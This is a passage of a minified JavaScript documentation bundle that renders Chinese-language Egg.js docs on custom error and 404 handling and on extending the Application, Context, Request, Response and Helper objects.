\u683c\u5f0f\u54cd\u5e94\uff0c\u4e0d\u5e26\u8be6\u7ec6\u7684\u9519\u8bef\u4fe1\u606f")))),r.a.createElement("h3",{id:"errorpageurl"},r.a.createElement(l["AnchorLink"],{to:"#errorpageurl","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"errorPageUrl"),r.a.createElement("p",null,"onerror \u63d2\u4ef6\u7684\u914d\u7f6e\u4e2d\u652f\u6301 errorPageUrl \u5c5e\u6027\uff0c\u5f53\u914d\u7f6e\u4e86 errorPageUrl \u65f6\uff0c\u4e00\u65e6\u7528\u6237\u8bf7\u6c42\u7ebf\u4e0a\u5e94\u7528\u7684 HTML \u9875\u9762\u5f02\u5e38\uff0c\u5c31\u4f1a\u91cd\u5b9a\u5411\u5230\u8fd9\u4e2a\u5730\u5740\u3002"),r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  onerror: {\n    // \u7ebf\u4e0a\u9875\u9762\u53d1\u751f\u5f02\u5e38\u65f6\uff0c\u91cd\u5b9a\u5411\u5230\u8fd9\u4e2a\u9875\u9762\u4e0a\n    errorPageUrl: '/50x.html',\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"\u81ea\u5b9a\u4e49\u7edf\u4e00\u5f02\u5e38\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u7edf\u4e00\u5f02\u5e38\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u7edf\u4e00\u5f02\u5e38\u5904\u7406"),r.a.createElement("p",null,"\u5c3d\u7ba1\u6846\u67b6\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u7edf\u4e00\u5f02\u5e38\u5904\u7406\u673a\u5236\uff0c\u4f46\u662f\u5e94\u7528\u5f00\u53d1\u4e2d\u7ecf\u5e38\u9700\u8981\u5bf9\u5f02\u5e38\u65f6\u7684\u54cd\u5e94\u505a\u81ea\u5b9a\u4e49\uff0c\u7279\u522b\u662f\u5728\u505a\u4e00\u4e9b\u63a5\u53e3\u5f00\u53d1\u7684\u65f6\u5019\u3002\u6846\u67b6\u81ea\u5e26\u7684 onerror \u63d2\u4ef6\u652f\u6301\u81ea\u5b9a\u4e49\u914d\u7f6e\u9519\u8bef\u5904\u7406\u65b9\u6cd5\uff0c\u53ef\u4ee5\u8986\u76d6\u9ed8\u8ba4\u7684\u9519\u8bef\u5904\u7406\u65b9\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  onerror: {\n    all(err, ctx) {\n      // \u5728\u6b64\u5904\u5b9a\u4e49\u9488\u5bf9\u6240\u6709\u54cd\u5e94\u7c7b\u578b\u7684\u9519\u8bef\u5904\u7406\u65b9\u6cd5\n      // \u6ce8\u610f\uff0c\u5b9a\u4e49\u4e86 config.all \u4e4b\u540e\uff0c\u5176\u4ed6\u9519\u8bef\u5904\u7406\u65b9\u6cd5\u4e0d\u4f1a\u518d\u751f\u6548\n      ctx.body = 'error';\n      ctx.status = 500;\n    },\n    html(err, ctx) {\n      // html hander\n      ctx.body = '<h3>error</h3>';\n      ctx.status = 500;\n    },\n    json(err, ctx) {\n      // json hander\n      ctx.body = { message: 'error' };\n      ctx.status = 500;\n    },\n    jsonp(err, ctx) {\n      // \u4e00\u822c\u6765\u8bf4\uff0c\u4e0d\u9700\u8981\u7279\u6b8a\u9488\u5bf9 jsonp \u8fdb\u884c\u9519\u8bef\u5b9a\u4e49\uff0cjsonp \u7684\u9519\u8bef\u5904\u7406\u4f1a\u81ea\u52a8\u8c03\u7528 json \u9519\u8bef\u5904\u7406\uff0c\u5e76\u5305\u88c5\u6210 jsonp \u7684\u54cd\u5e94\u683c\u5f0f\n    },\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"404"},r.a.createElement(l["AnchorLink"],{to:"#404","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"404"),r.a.createElement("p",null,"\u6846\u67b6\u5e76\u4e0d\u4f1a\u5c06\u670d\u52a1\u7aef\u8fd4\u56de\u7684 404 \u72b6\u6001\u5f53\u505a\u5f02\u5e38\u6765\u5904\u7406\uff0c\u4f46\u662f\u6846\u67b6\u63d0\u4f9b\u4e86\u5f53\u54cd\u5e94\u4e3a 404 \u4e14\u6ca1\u6709\u8fd4\u56de body \u65f6\u7684\u9ed8\u8ba4\u54cd\u5e94\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u5f53\u8bf7\u6c42\u88ab\u6846\u67b6\u5224\u5b9a\u4e3a\u9700\u8981 JSON \u683c\u5f0f\u7684\u54cd\u5e94\u65f6\uff0c\u4f1a\u8fd4\u56de\u4e00\u6bb5 JSON\uff1a"),r.a.createElement(o["a"],{code:'{ "message": "Not Found" }',lang:"json"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u5f53\u8bf7\u6c42\u88ab\u6846\u67b6\u5224\u5b9a\u4e3a\u9700\u8981 HTML \u683c\u5f0f\u7684\u54cd\u5e94\u65f6\uff0c\u4f1a\u8fd4\u56de\u4e00\u6bb5 HTML\uff1a"),r.a.createElement(o["a"],{code:"<h1>404 Not Found</h1>",lang:"html"}))),r.a.createElement("p",null,"\u6846\u67b6\u652f\u6301\u901a\u8fc7\u914d\u7f6e\uff0c\u5c06\u9ed8\u8ba4\u7684 HTML \u8bf7\u6c42\u7684 404 \u54cd\u5e94\u91cd\u5b9a\u5411\u5230\u6307\u5b9a\u7684\u9875\u9762\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  notfound: {\n    pageUrl: '/404.html',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49-404-\u54cd\u5e94"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49-404-\u54cd\u5e94","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49 404 \u54cd\u5e94"),r.a.createElement("p",null,"\u5728\u4e00\u4e9b\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u9700\u8981\u81ea\u5b9a\u4e49\u670d\u52a1\u5668 404 \u65f6\u7684\u54cd\u5e94\uff0c\u548c\u81ea\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u4e00\u6837\uff0c\u6211\u4eec\u4e5f\u53ea\u9700\u8981\u52a0\u5165\u4e00\u4e2a\u4e2d\u95f4\u4ef6\u5373\u53ef\u5bf9 404 \u505a\u7edf\u4e00\u5904\u7406\uff1a"),r.a.createElement(o["a"],{code:"// app/middleware/notfound_handler.js\nmodule.exports = () => {\n  return async function notFoundHandler(ctx, next) {\n    await next();\n    if (ctx.status === 404 && !ctx.body) {\n      if (ctx.acceptJSON) {\n        ctx.body = { error: 'Not Found' };\n      } else {\n        ctx.body = '<h1>Page Not Found</h1>';\n      }\n    }\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u5728\u914d\u7f6e\u4e2d\u5f15\u5165\u4e2d\u95f4\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  middleware: ['notfoundHandler'],\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},J84a:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u591a\u79cd\u6269\u5c55\u70b9\u6269\u5c55\u81ea\u8eab\u7684\u529f\u80fd\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Application"),r.a.createElement("li",null,"Context"),r.a.createElement("li",null,"Request"),r.a.createElement("li",null,"Response"),r.a.createElement("li",null,"Helper")),r.a.createElement("p",null,"\u5728\u5f00\u53d1\u4e2d\uff0c\u6211\u4eec\u65e2\u53ef\u4ee5\u4f7f\u7528\u5df2\u6709\u7684\u6269\u5c55 API \u6765\u65b9\u4fbf\u5f00\u53d1\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u4ee5\u4e0a\u5bf9\u8c61\u8fdb\u884c\u81ea\u5b9a\u4e49\u6269\u5c55\uff0c\u8fdb\u4e00\u6b65\u52a0\u5f3a\u6846\u67b6\u7684\u529f\u80fd\u3002"),r.a.createElement("h2",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,r.a.createElement("code",null,"app")," \u5bf9\u8c61\u6307\u7684\u662f Koa \u7684\u5168\u5c40\u5e94\u7528\u5bf9\u8c61\uff0c\u5168\u5c40\u53ea\u6709\u4e00\u4e2a\uff0c\u5728\u5e94\u7528\u542f\u52a8\u65f6\u88ab\u521b\u5efa\u3002"),r.a.createElement("h3",{id:"\u8bbf\u95ee\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u65b9\u5f0f"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"ctx.app"))),r.a.createElement("li",null,r.a.createElement("p",null,"Controller\uff0cMiddleware\uff0cHelper\uff0cService \u4e2d\u90fd\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"this.app")," \u8bbf\u95ee\u5230 Application \u5bf9\u8c61\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"this.app.config")," \u8bbf\u95ee\u914d\u7f6e\u5bf9\u8c61\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"app.js")," \u4e2d ",r.a.createElement("code",null,"app")," \u5bf9\u8c61\u4f1a\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u6ce8\u5165\u5230\u5165\u53e3\u51fd\u6570\u4e2d"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // \u4f7f\u7528 app \u5bf9\u8c61\n};",lang:"js"}))),r.a.createElement("h3",{id:"\u6269\u5c55\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u4f1a\u628a ",r.a.createElement("code",null,"app/extend/application.js")," \u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\u4e0e Koa Application \u7684 prototype \u5bf9\u8c61\u8fdb\u884c\u5408\u5e76\uff0c\u5728\u5e94\u7528\u542f\u52a8\u65f6\u4f1a\u57fa\u4e8e\u6269\u5c55\u540e\u7684 prototype \u751f\u6210 ",r.a.createElement("code",null,"app")," \u5bf9\u8c61\u3002"),r.a.createElement("h4",{id:"\u65b9\u6cd5\u6269\u5c55"},r.a.createElement(l["AnchorLink"],{to:"#\u65b9\u6cd5\u6269\u5c55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65b9\u6cd5\u6269\u5c55"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6211\u4eec\u8981\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"app.foo()")," \u65b9\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/application.js\nmodule.exports = {\n  foo(param) {\n    // this \u5c31\u662f app \u5bf9\u8c61\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u8c03\u7528 app \u4e0a\u7684\u5176\u4ed6\u65b9\u6cd5\uff0c\u6216\u8bbf\u95ee\u5c5e\u6027\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"\u5c5e\u6027\u6269\u5c55"},r.a.createElement(l["AnchorLink"],{to:"#\u5c5e\u6027\u6269\u5c55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5c5e\u6027\u6269\u5c55"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\u5c5e\u6027\u7684\u8ba1\u7b97\u53ea\u9700\u8981\u8fdb\u884c\u4e00\u6b21\uff0c\u90a3\u4e48\u4e00\u5b9a\u8981\u5b9e\u73b0\u7f13\u5b58\uff0c\u5426\u5219\u5728\u591a\u6b21\u8bbf\u95ee\u5c5e\u6027\u65f6\u4f1a\u8ba1\u7b97\u591a\u6b21\uff0c\u8fd9\u6837\u4f1a\u964d\u4f4e\u5e94\u7528\u6027\u80fd\u3002"),r.a.createElement("p",null,"\u63a8\u8350\u7684\u65b9\u5f0f\u662f\u4f7f\u7528 Symbol + Getter \u7684\u6a21\u5f0f\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"app.bar")," \u5c5e\u6027 Getter\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/application.js\nconst BAR = Symbol('Application#bar');\n\nmodule.exports = {\n  get bar() {\n    // this \u5c31\u662f app \u5bf9\u8c61\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u8c03\u7528 app \u4e0a\u7684\u5176\u4ed6\u65b9\u6cd5\uff0c\u6216\u8bbf\u95ee\u5c5e\u6027\n    if (!this[BAR]) {\n      // \u5b9e\u9645\u60c5\u51b5\u80af\u5b9a\u66f4\u590d\u6742\n      this[BAR] = this.config.xx + this.config.yy;\n    }\n    return this[BAR];\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Context \u6307\u7684\u662f Koa \u7684\u8bf7\u6c42\u4e0a\u4e0b\u6587\uff0c\u8fd9\u662f ",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b")," \u7684\u5bf9\u8c61\uff0c\u6bcf\u6b21\u8bf7\u6c42\u751f\u6210\u4e00\u4e2a Context \u5b9e\u4f8b\uff0c\u901a\u5e38\u6211\u4eec\u4e5f\u7b80\u5199\u6210 ",r.a.createElement("code",null,"ctx"),"\u3002\u5728\u6240\u6709\u7684\u6587\u6863\u4e2d\uff0cContext \u548c ",r.a.createElement("code",null,"ctx")," \u90fd\u662f\u6307 Koa \u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\u3002"),r.a.createElement("h3",{id:"\u8bbf\u95ee\u65b9\u5f0f-1"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u65b9\u5f0f-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u65b9\u5f0f"),r.a.createElement("ul",null,r.a.createElement("li",null,"middleware \u4e2d ",r.a.createElement("code",null,"this")," \u5c31\u662f ctx\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"this.cookies.get('foo')"),"\u3002"),r.a.createElement("li",null,"controller \u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u7c7b\u7684\u5199\u6cd5\u901a\u8fc7 ",r.a.createElement("code",null,"this.ctx"),"\uff0c\u65b9\u6cd5\u7684\u5199\u6cd5\u76f4\u63a5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx")," \u5165\u53c2\u3002"),r.a.createElement("li",null,"helper\uff0cservice \u4e2d\u7684 this \u6307\u5411 helper\uff0cservice \u5bf9\u8c61\u672c\u8eab\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"this.ctx")," \u8bbf\u95ee context \u5bf9\u8c61\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"this.ctx.cookies.get('foo')"),"\u3002")),r.a.createElement("h3",{id:"\u6269\u5c55\u65b9\u5f0f-1"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u65b9\u5f0f-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u4f1a\u628a ",r.a.createElement("code",null,"app/extend/context.js")," \u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\u4e0e Koa Context \u7684 prototype \u5bf9\u8c61\u8fdb\u884c\u5408\u5e76\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u4f1a\u57fa\u4e8e\u6269\u5c55\u540e\u7684 prototype \u751f\u6210 ctx \u5bf9\u8c61\u3002"),r.a.createElement("h4",{id:"\u65b9\u6cd5\u6269\u5c55-1"},r.a.createElement(l["AnchorLink"],{to:"#\u65b9\u6cd5\u6269\u5c55-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65b9\u6cd5\u6269\u5c55"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6211\u4eec\u8981\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"ctx.foo()")," \u65b9\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  foo(param) {\n    // this \u5c31\u662f ctx \u5bf9\u8c61\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u8c03\u7528 ctx \u4e0a\u7684\u5176\u4ed6\u65b9\u6cd5\uff0c\u6216\u8bbf\u95ee\u5c5e\u6027\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"\u5c5e\u6027\u6269\u5c55-1"},r.a.createElement(l["AnchorLink"],{to:"#\u5c5e\u6027\u6269\u5c55-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5c5e\u6027\u6269\u5c55"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\u5c5e\u6027\u7684\u8ba1\u7b97\u5728\u540c\u4e00\u6b21\u8bf7\u6c42\u4e2d\u53ea\u9700\u8981\u8fdb\u884c\u4e00\u6b21\uff0c\u90a3\u4e48\u4e00\u5b9a\u8981\u5b9e\u73b0\u7f13\u5b58\uff0c\u5426\u5219\u5728\u540c\u4e00\u6b21\u8bf7\u6c42\u4e2d\u591a\u6b21\u8bbf\u95ee\u5c5e\u6027\u65f6\u4f1a\u8ba1\u7b97\u591a\u6b21\uff0c\u8fd9\u6837\u4f1a\u964d\u4f4e\u5e94\u7528\u6027\u80fd\u3002"),r.a.createElement("p",null,"\u63a8\u8350\u7684\u65b9\u5f0f\u662f\u4f7f\u7528 Symbol + Getter \u7684\u6a21\u5f0f\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"ctx.bar")," \u5c5e\u6027 Getter\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nconst BAR = Symbol('Context#bar');\n\nmodule.exports = {\n  get bar() {\n    // this \u5c31\u662f ctx \u5bf9\u8c61\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u8c03\u7528 ctx \u4e0a\u7684\u5176\u4ed6\u65b9\u6cd5\uff0c\u6216\u8bbf\u95ee\u5c5e\u6027\n    if (!this[BAR]) {\n      // \u4f8b\u5982\uff0c\u4ece header \u4e2d\u83b7\u53d6\uff0c\u5b9e\u9645\u60c5\u51b5\u80af\u5b9a\u66f4\u590d\u6742\n      this[BAR] = this.get('x-bar');\n    }\n    return this[BAR];\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"request"},r.a.createElement(l["AnchorLink"],{to:"#request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request"),r.a.createElement("p",null,"Request \u5bf9\u8c61\u548c Koa \u7684 Request \u5bf9\u8c61\u76f8\u540c\uff0c\u662f ",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b")," \u7684\u5bf9\u8c61\uff0c\u5b83\u63d0\u4f9b\u4e86\u5927\u91cf\u8bf7\u6c42\u76f8\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u4f9b\u4f7f\u7528\u3002"),r.a.createElement("h3",{id:"\u8bbf\u95ee\u65b9\u5f0f-2"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u65b9\u5f0f-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u65b9\u5f0f"),r.a.createElement(o["a"],{code:"ctx.request;",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"ctx")," \u4e0a\u7684\u5f88\u591a\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u88ab\u4ee3\u7406\u5230 ",r.a.createElement("code",null,"request")," \u5bf9\u8c61\u4e0a\uff0c\u5bf9\u4e8e\u8fd9\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u4f7f\u7528 ",r.a.createElement("code",null,"ctx")," \u548c\u4f7f\u7528 ",r.a.createElement("code",null,"request")," \u53bb\u8bbf\u95ee\u5b83\u4eec\u662f\u7b49\u4ef7\u7684\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"ctx.url === ctx.request.url"),"\u3002"),r.a.createElement("p",null,"Koa \u5185\u7f6e\u7684\u4ee3\u7406 ",r.a.createElement("code",null,"request")," \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5217\u8868\uff1a",r.a.createElement(l["Link"],{to:"http://koajs.com/#request-aliases"},"Koa - Request aliases")),r.a.createElement("h3",{id:"\u6269\u5c55\u65b9\u5f0f-2"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u65b9\u5f0f-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u4f1a\u628a ",r.a.createElement("code",null,"app/extend/request.js")," \u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\u4e0e\u5185\u7f6e ",r.a.createElement("code",null,"request")," \u7684 prototype \u5bf9\u8c61\u8fdb\u884c\u5408\u5e76\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u4f1a\u57fa\u4e8e\u6269\u5c55\u540e\u7684 prototype \u751f\u6210 ",r.a.createElement("code",null,"request")," \u5bf9\u8c61\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"request.foo")," \u5c5e\u6027 Getter\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/request.js\nmodule.exports = {\n  get foo() {\n    return this.get('x-request-foo');\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"response"},r.a.createElement(l["AnchorLink"],{to:"#response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Response"),r.a.createElement("p",null,"Response \u5bf9\u8c61\u548c Koa \u7684 Response \u5bf9\u8c61\u76f8\u540c\uff0c\u662f ",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b")," \u7684\u5bf9\u8c61\uff0c\u5b83\u63d0\u4f9b\u4e86\u5927\u91cf\u54cd\u5e94\u76f8\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u4f9b\u4f7f\u7528\u3002"),r.a.createElement("h3",{id:"\u8bbf\u95ee\u65b9\u5f0f-3"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u65b9\u5f0f-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u65b9\u5f0f"),r.a.createElement(o["a"],{code:"ctx.response;",lang:"js"}),r.a.createElement("p",null,"ctx \u4e0a\u7684\u5f88\u591a\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u88ab\u4ee3\u7406\u5230 ",r.a.createElement("code",null,"response")," \u5bf9\u8c61\u4e0a\uff0c\u5bf9\u4e8e\u8fd9\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u4f7f\u7528 ",r.a.createElement("code",null,"ctx")," \u548c\u4f7f\u7528 ",r.a.createElement("code",null,"response")," \u53bb\u8bbf\u95ee\u5b83\u4eec\u662f\u7b49\u4ef7\u7684\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"ctx.status = 404")," \u548c ",r.a.createElement("code",null,"ctx.response.status = 404")," \u662f\u7b49\u4ef7\u7684\u3002"),r.a.createElement("p",null,"Koa \u5185\u7f6e\u7684\u4ee3\u7406 ",r.a.createElement("code",null,"response")," \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5217\u8868\uff1a",r.a.createElement(l["Link"],{to:"http://koajs.com/#response-aliases"},"Koa Response aliases")),r.a.createElement("h3",{id:"\u6269\u5c55\u65b9\u5f0f-3"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u65b9\u5f0f-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u4f1a\u628a ",r.a.createElement("code",null,"app/extend/response.js")," \u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\u4e0e\u5185\u7f6e ",r.a.createElement("code",null,"response")," \u7684 prototype \u5bf9\u8c61\u8fdb\u884c\u5408\u5e76\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u4f1a\u57fa\u4e8e\u6269\u5c55\u540e\u7684 prototype \u751f\u6210 ",r.a.createElement("code",null,"response")," \u5bf9\u8c61\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u589e\u52a0\u4e00\u4e2a ",r.a.createElement("code",null,"response.foo")," \u5c5e\u6027 setter\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/response.js\nmodule.exports = {\n  set foo(value) {\n    this.set('x-response-foo', value);\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5c31\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\u5566\uff1a",r.a.createElement("code",null,"this.response.foo = 'bar';")),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Helper \u51fd\u6570\u7528\u6765\u63d0\u4f9b\u4e00\u4e9b\u5b9e\u7528\u7684 utility \u51fd\u6570\u3002"),r.a.createElement("p",null,"\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e9b\u5e38\u7528\u7684\u52a8\u4f5c\u62bd\u79bb\u5728 helper.js \u91cc\u9762\u6210\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u53ef\u4ee5\u7528 JavaScript \u6765\u5199\u590d\u6742\u7684\u903b\u8f91\uff0c\u907f\u514d\u903b\u8f91\u5206\u6563\u5404\u5904\u3002\u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\u662f Helper \u8fd9\u6837\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u66f4\u5bb9\u6613\u7f16\u5199\u6d4b\u8bd5\u7528\u4f8b\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86\u4e00\u4e9b\u5e38\u7528\u7684 Helper \u51fd\u6570\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u7f16\u5199\u81ea\u5b9a\u4e49\u7684 Helper \u51fd\u6570\u3002"),r.a.createElement("h3",{id:"\u8bbf\u95ee\u65b9\u5f0f-4"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u65b9\u5f0f-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u65b9\u5f0f"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.helper")," \u8bbf\u95ee\u5230 helper \u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a"),r.a.createElement(o["a"],{code:"// \u5047\u8bbe\u5728 app/router.js \u4e2d\u5b9a\u4e49\u4e86 home router\napp.get('home', '/', 'home.index');\n\n// \u4f7f\u7528 helper \u8ba1\u7b97\u6307\u5b9a url path\nctx.helper.pathFor('home', { by: 'recent', limit: 20 });\n// => /?by=recent&limit=20",lang:"js"}),r.a.createElement("h3",{id:"\u6269\u5c55\u65b9\u5f0f-4"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u65b9\u5f0f-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u4f1a\u628a ",r.a.createElement("code",null,"app/extend/helper.js")," \u4e2d\u5b9a\u4e49\u7684\u5bf9\u8c61\u4e0e\u5185\u7f6e ",r.a.createElement("code",null,"helper")," \u7684 prototype \u5bf9\u8c61\u8fdb\u884c\u5408\u5e76\uff0c\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u4f1a\u57fa\u4e8e\u6269\u5c55\u540e\u7684 prototype \u751f\u6210 